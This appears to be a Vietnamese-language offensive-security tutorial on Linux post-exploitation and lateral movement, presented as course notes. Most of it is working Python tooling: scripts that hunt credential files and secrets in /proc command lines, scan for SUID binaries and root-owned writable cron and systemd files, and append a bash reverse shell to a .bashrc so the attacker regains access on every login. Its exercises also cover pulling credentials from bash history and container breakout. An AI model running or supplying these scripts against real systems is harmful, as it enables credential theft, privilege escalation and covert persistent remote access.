# Post exploitation and Lateral movement
## 1.1. Post Exploitation là gì?
Post exploitation là toàn bộ hoạt động sau khi đã có foothold (một điểm đứng trong target).
Mục tiêu:
- Khai thác tối đa quyền truy cập hiện có.
- Thu thập thông tin hữu ích cho các bước tiếp theo.
- Mở rộng quyền, tìm tài sản giá trị, hoặc duy trì truy cập.
- Không làm gián đoạn hệ thống (stealth).

## 1.2. Lateral Movement là gì?
Lateral movement là việc di chuyển sang các máy khác trong cùng mạng nội bộ sau khi đã chiếm được một máy ban đầu.

Ví dụ:
- Từ webserver → database.
- Từ user machine → Domain Controller.
- Từ container → host.

## 1.3. Mindset – Tư duy đúng trong Post Exploitation

- Không gây noise, không làm hệ thống crash.
- Thu thập dữ liệu → phân tích → hành động.
- Không drop binary không cần thiết.
- User thường để password khắp nơi.
- Máy hiện tại có thể chỉ là bàn đạp.

# 2 Gold-mining on Linux system
## 2.1. Credential Hunting
### Tư duy:
- Dev để credential “tạm” khắp nơi.
- Trên server, credential cho các dịch vụ như database thường bắt buộc để cleartext
- Script tự động thường chứa password plaintext.
- Dev / sys admin có thể để credential yếu hoặc reuse

### Các nguồn phổ biến:

- Bash history: .bash_history
- SSH keys: ~/.ssh/id_rsa, authorized_keys
- Config của service: config.php, .env
- Git configuration: .git-credentials, .git/config
- Backup files: *.bak, config.old
- Process command lines: /proc/*/cmdline

### Ví dụ
- Tạo 1 script sử dụng os walkdir để tìm file có file name nằm trong list `goldmine = ["config.php", ".git-credentials", "id.rsa"]`. Lưu ý: walk dir khác walk dir đệ quy
```
import os

# Danh sách các tên tệp mục tiêu cần tìm
goldmine = ["config.php", ".git-credentials", "id.rsa"]

def find_sensitive_files(start_dir):
    """
    Duyệt qua các thư mục bắt đầu từ start_dir và tìm các tệp có tên trong danh sách goldmine.
    """
    print(f"[*] Bắt đầu tìm kiếm từ thư mục: {os.path.abspath(start_dir)}")
    print(f"[*] Các tệp cần tìm: {goldmine}\n")

    found_count = 0

    # os.walk trả về tuple (root, dirs, files) cho mỗi thư mục
    for root, _, files in os.walk(start_dir):
        # Lặp qua các tệp trong thư mục hiện tại (root)
        for file_name in files:
            # Kiểm tra xem tên tệp có nằm trong danh sách goldmine không
            if file_name in goldmine:
                # Tìm thấy tệp!
                full_path = os.path.join(root, file_name)

                # In đường dẫn tuyệt đối của tệp tìm thấy
                print(f"[+] Đã tìm thấy: {os.path.abspath(full_path)}")
                found_count += 1

    if found_count == 0:
        print("\n[!] Không tìm thấy tệp nào trong danh sách.")
    else:
        print(f"\n[*] Tổng cộng đã tìm thấy {found_count} tệp.")

if __name__ == "__main__":
    # Đặt thư mục bắt đầu tìm kiếm là thư mục hiện tại ('.')
    find_sensitive_files('/tmp/')
```
- Nghiên cứu procfs, tạo 1 script đọc cmdline trong procfs của toàn bộ tiến trình đang chạy
```
import os

# Danh sách các chuỗi cần tìm
SENSITIVE_KEYWORDS = ["password=", "passwd=", "pass="]

def check_procfs_cmdlines():
    """
    Duyệt qua /proc/[PID]/cmdline để tìm các chuỗi nhạy cảm.
    """

    # Chỉ hoạt động trên hệ thống giống Unix/Linux
    if not os.path.isdir('/proc'):
        print("[!] Không tìm thấy thư mục /proc. Script này chỉ hoạt động trên Linux/Unix.")
        return
    print("[*] Bắt đầu kiểm tra các tham số dòng lệnh trong /proc...")
    print(f"[*] Các từ khóa nhạy cảm: {SENSITIVE_KEYWORDS}\n")

    found_secrets = False

    # 1. Lặp qua các thư mục con trong /proc
    for entry in os.listdir('/proc'):
        # Kiểm tra xem tên thư mục có phải là PID (chỉ gồm số) không
        if entry.isdigit():
            pid = entry
            cmdline_path = os.path.join('/proc', pid, 'cmdline')

            # Kiểm tra xem file cmdline có tồn tại không
            if os.path.exists(cmdline_path):
                try:
                    # 2. Đọc nội dung file cmdline
                    # cmdline chứa các tham số cách nhau bởi ký tự null (\x00)
                    with open(cmdline_path, 'rb') as f:
                        content = f.read()

                    # Thay thế ký tự null bằng khoảng trắng để dễ đọc
                    cmdline_str = content.replace(b'\x00', b' ').decode('utf-8', errors='ignore').strip()

                    # 3. Kiểm tra các từ khóa nhạy cảm
                    for keyword in SENSITIVE_KEYWORDS:
                        if keyword in cmdline_str:
                            found_secrets = True
                            # In ra PID và tham số bị lộ
                            print("--------------------------------------------------")
                            print(f"[+] PHÁT HIỆN bí mật trong tiến trình (PID: {pid}):")
                            print(f"    Dòng lệnh đầy đủ: {cmdline_str}")
                            print("--------------------------------------------------")
                            # Đã tìm thấy một khớp cho PID này, chuyển sang PID tiếp theo
                            break
                except Exception:
                    pass

    if not found_secrets:
        print("\n[*] Không tìm thấy tham số nhạy cảm nào khớp với danh sách từ khóa.")

if __name__ == '__main__':
    check_procfs_cmdlines()
```

- Bài tập: Đọc bash history và trích xuất credential. Recommend iterate từng dòng.

## 2.2 Priv Escalation
### Mindset:
- Khi deploy sản phẩm product, sys admin có thể tạo ra sai sót
- Product có thể cần nhiều permissions để thực hiện được chức năng. Điều này vi phạm quy tắc "least privilege" và tạo ra attack surface.
- Không phải product nào cũng có hardening và audit cẩn thận
- Product có thể thay đổi cấu hình tài nguyên hệ thống trong những lần cập nhật, phá vỡ hardening đã áp dụng.
- Product vào trạng thái stable sẽ ít được sys admin cập nhật patch dẫn đến tồn tại exploitable từ unpatched services

### Tactics
- Mis-configuration dẫn đến lộ credential hoặc cho phép sửa đổi được tài nguyên hệ thống:
 + Cho phép sửa đổi cronjob hoặc service unit
 + Writable file / folder cho phép chèn mã độc
- Cấp quá quyền cho phép: SUID binaries hoặc sudoders commands, Capabilities của file (Linux capability).

### Example
- Tạo script tìm suid binary (advanced: SUID bởi owner nào)
```
import os
import stat
import pwd
import getpass

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin']
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_dangerous_suid_binaries():
    """
    Quét các thư mục, tìm các tệp SUID và kiểm tra điều kiện "nguy hiểm".
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: {current_username} (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")

    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        for root, dirs, files in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for file_name in files:
                full_path = os.path.join(root, file_name)

                # Bỏ qua nếu không phải là file hoặc không thể truy cập
                if not os.path.isfile(full_path):
                    continue

                try:
                    # 1. Lấy thông tin stat của file
                    file_stat = os.lstat(full_path)
                    mode = file_stat.st_mode

                    # 2. Kiểm tra bit SUID
                    if mode & stat.S_ISUID:
                        found_count += 1

                        # 3. Lấy Owner UID và User/Group Execute Permission
                        file_owner_uid = file_stat.st_uid
                        is_executable = os.access(full_path, os.X_OK)

                        # Dịch UID thành username
                        try:
                            file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                        except KeyError:
                            file_owner_name = f"Unknown UID ({file_owner_uid})"

                        # 4. Kiểm tra điều kiện "Nguy hiểm"
                        # Nguy hiểm khi: (Owner khác User đang thực thi) VÀ (User đang thực thi có quyền Execute)
                        if file_owner_uid != current_uid and is_executable:
                            print(f" **Tìm thấy SUID binary nguy hiểm (Tiềm năng):** {full_path}")
                            print(f"   - Owner: {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) CÓ quyền thực thi.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các file mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các file bị xóa trong quá trình quét
                    pass

    if found_count == 0:
        print("\n[!] Không tìm thấy SUID binary nào trong các thư mục được quét.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} SUID binary.")

if __name__ == "__main__":
    find_dangerous_suid_binaries()
```

- Tạo script tìm writable folder (user hiện tại write được folder user khác)
```
import os
import getpass
import pwd

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/home', '/var/tmp', '/tmp', '/usr/local'] 
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_writable_foreign_folders():
    """
    Duyệt qua các thư mục, tìm các thư mục có thể ghi được (writable)
    nhưng Owner lại khác user đang chạy script.
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")
    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        # os.walk để duyệt qua các thư mục và thư mục con
        for root, dirs, _ in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for dir_name in dirs:
                full_path = os.path.join(root, dir_name)
                try:
                    # 1. Lấy thông tin stat của thư mục
                    file_stat = os.lstat(full_path)
                    # 2. Kiểm tra quyền ghi (writable)
                    # os.access(path, os.W_OK) kiểm tra xem user hiện tại có quyền ghi không.
                    is_writable = os.access(full_path, os.W_OK)
                    if is_writable:
                        file_owner_uid = file_stat.st_uid
                        # 3. Kiểm tra điều kiện chính: Có thể ghi VÀ Owner khác
                        if file_owner_uid != current_uid:
                            found_count += 1
                            # Dịch UID thành username
                            try:
                                file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                            except KeyError:
                                file_owner_name = f"Unknown UID ({file_owner_uid})"

                            print(f" **Tìm thấy thư mục có thể ghi Owner khác:** {full_path}")
                            print(f"   - **Owner:** {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào thư mục này.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các thư mục mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các lỗi khác (ví dụ: file/thư mục bị xóa trong quá trình quét)
                    pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy thư mục writable nào có owner khác user hiện tại.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} thư mục tiềm năng.")

if __name__ == "__main__":
    find_writable_foreign_folders()
```

- Tạo script tìm system service có thể ghi được:
```
import os
import getpass
import pwd

# Danh sách các thư mục chứa các tệp cấu hình quan trọng cần kiểm tra
CONFIG_PATHS = [
    # Cronjob Files
    '/etc/crontab',
    '/etc/cron.d',
    '/etc/cron.hourly',
    '/etc/cron.daily',
    '/etc/cron.weekly',
    '/etc/cron.monthly',
    
    # Systemd Service Files
    '/etc/systemd/system',
    '/lib/systemd/system',
    
    # Init.d/SysVinit Files
    '/etc/init.d',
    
    # At Job Files (ít phổ biến hơn)
    '/var/spool/cron/atjobs', 
]

def is_writable_by_current_user(filepath):
    """Kiểm tra xem user hiện tại có quyền ghi vào tệp/thư mục không."""
    return os.access(filepath, os.W_OK)

def find_writable_config_files():
    """
    Duyệt qua các đường dẫn cấu hình, tìm các tệp có thể ghi được và 
    Owner khác với user hiện tại.
    """
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print("[*] Bắt đầu quét các thư mục/tệp cấu hình quan trọng...\n")
    found_count = 0

    # Lặp qua các đường dẫn đã định nghĩa
    for path in CONFIG_PATHS:
        if not os.path.exists(path):
            continue

        if os.path.isfile(path):
            # Nếu là một tệp (ví dụ: /etc/crontab)
            files_to_check = [path]
        else:
            # Nếu là một thư mục (ví dụ: /etc/cron.d)
            try:
                # Lấy tất cả tệp/thư mục trong thư mục con
                files_to_check = [os.path.join(path, f) for f in os.listdir(path)]
            except PermissionError:
                continue

        for full_path in files_to_check:
            # Chỉ kiểm tra các tệp, bỏ qua các thư mục con trong thư mục cron/systemd
            # Bỏ qua symlink vì symlink luôn hiển thị quyền write (mặc dù k được)
            if not os.path.isfile(full_path) and os.path.islink(full_path):
                continue

            try:
                # 1. Kiểm tra quyền ghi
                if is_writable_by_current_user(full_path):
                    file_stat = os.lstat(full_path)
                    file_owner_uid = file_stat.st_uid
                    # 2. Kiểm tra Owner
                    file_owner_name = "Unknown"
                    try:
                        file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                    except KeyError:
                        pass # UID không tồn tại

                    # Điều kiện báo cáo: Có thể ghi VÀ Owner khác root (hoặc khác user hiện tại nếu muốn)
                    # Ở đây ta ưu tiên tìm các file có thể ghi được mà chạy với quyền root (UID=0)
                    if file_owner_uid == 0:
                        # Thư mục/tệp cấu hình chạy với quyền root mà user thường có thể ghi
                        found_count += 1
                        print(f" **PHÁT HIỆN tệp cấu hình Writable & Root Owner:** {full_path}")
                        print("   - **Owner:** root (UID: 0)")
                        print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào tệp này.")
                        print("-" * 60)
                    # (Tùy chọn) In ra tất cả các file writable có owner khác user hiện tại
                    elif file_owner_uid != current_uid:
                        print(f"[+] Tìm thấy Writable Config File Owner khác: {full_path}")
                        print(f"   - Owner: {file_owner_name}")
                        print("-" * 60)

            except PermissionError:
                # Bỏ qua các file mà script không có quyền truy cập thông tin
                pass
            except OSError:
                # Bỏ qua các lỗi khác
                pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy tệp cấu hình Writable (Owner root) nào.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} tệp cấu hình Root Writable.")

if __name__ == "__main__":
    find_writable_config_files()
```

Bài tập:
- Tạo script kiểm tra version của kernel, so sánh xem nó có tồn tại lỗ hổng hay không (làm logic đơn giản, ví dụ version "7.1.2" thì iterate so sánh version sau đó show ra 1 bug nào đó đã thấy trên mạng, lưu sẵn vào script) => Mô phỏng tìm unpatched có exploit, sau đó phát triển ra với process, service
- Enumerate kernel modules
- Enumerate namespace and Cgroup escape (container breakout)

## 2.3 Persistence
- Tại sao cần persistence?
 + Duy trì quyền kiểm soát qua reboot, patch, hay incident response.
 + Đảm bảo access ngay cả khi credential bị đổi hoặc machine / service bị restart
- Mindset:
 + Sẽ có những component sử dụng scripting, thực thi scripting. Ví dụ: ssh banner, hook script
 + On-event persistence: Chương trình được thực thi khi 1 event nhất định được thực hiện TODO hoàn thiện
 + Login persistence: chương trình được thực thi khi được boot TODO hoàn thiện
 + Vị trí càng ít người biết, càng khó bị phát hiện
- Vị trí:
 + bashrc, ... (TODO list)
 + Kernel module, bootloader, firmware, ...
 + Advanced: memory only (?)

### Example:
- Thêm 1 entry persistence vào 1 bashrc (ở đây sử dụng ví dụ là `/tmp/.bashrc`).
```
import os

# --- THÔNG SỐ CẦN THAY ĐỔI ---
# ĐỊA CHỈ IP và CỔNG CỦA MÁY ATTACKER (Server lắng nghe)
ATTACKER_IP = "127.0.0.1"  # Thay thế bằng IP thực tế
ATTACKER_PORT = 9001            # Thay thế bằng cổng lắng nghe thực tế
# -----------------------------

# Đường dẫn tệp mục tiêu
TARGET_FILE = "/tmp/.bashrc"

# Lệnh Reverse Shell (Bash)
# Lệnh này sẽ được chạy mỗi khi người dùng mở một terminal mới
REVERSE_SHELL_COMMAND = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"

def inject_reverse_shell():
    """
    Kiểm tra sự tồn tại của /tmp/.bashrc và chèn lệnh reverse shell.
    """
    print(f"[*] Đang kiểm tra tệp: {TARGET_FILE}")

    # 1. Kiểm tra sự tồn tại của tệp
    if os.path.exists(TARGET_FILE):
        print(f"[+] Tệp tồn tại: {TARGET_FILE}")
        # 2. Kiểm tra xem user có quyền ghi vào tệp không
        if os.access(TARGET_FILE, os.W_OK):
            print("[+] Có quyền ghi (Writable). Tiến hành chèn lệnh...")
            try:
                # 3. Mở tệp ở chế độ 'a' (append) để thêm vào cuối
                with open(TARGET_FILE, 'a') as f:
                    # Thêm ký tự xuống dòng trước lệnh (đảm bảo lệnh mới bắt đầu trên dòng mới)
                    f.write("\n\n# START INJECTED REVERSE SHELL\n")
                    f.write(REVERSE_SHELL_COMMAND)
                    f.write("\n# END INJECTED REVERSE SHELL\n")
                print(" CHÈN THÀNH CÔNG!")
                print(f"   Lệnh đã được chèn: {REVERSE_SHELL_COMMAND}")
                print("\n[!] Lệnh Reverse Shell sẽ được kích hoạt khi user khởi động shell mới.")
            except Exception as e:
                print(f"[-] LỖI: Không thể ghi vào tệp: {e}")
        else:
            print("[-] KHÔNG có quyền ghi (Writable) vào tệp. Không thể chèn lệnh.")
    else:
        print(f"[-] Tệp KHÔNG tồn tại: {TARGET_FILE}")

if __name__ == '__main__':
    inject_reverse_shell()

```
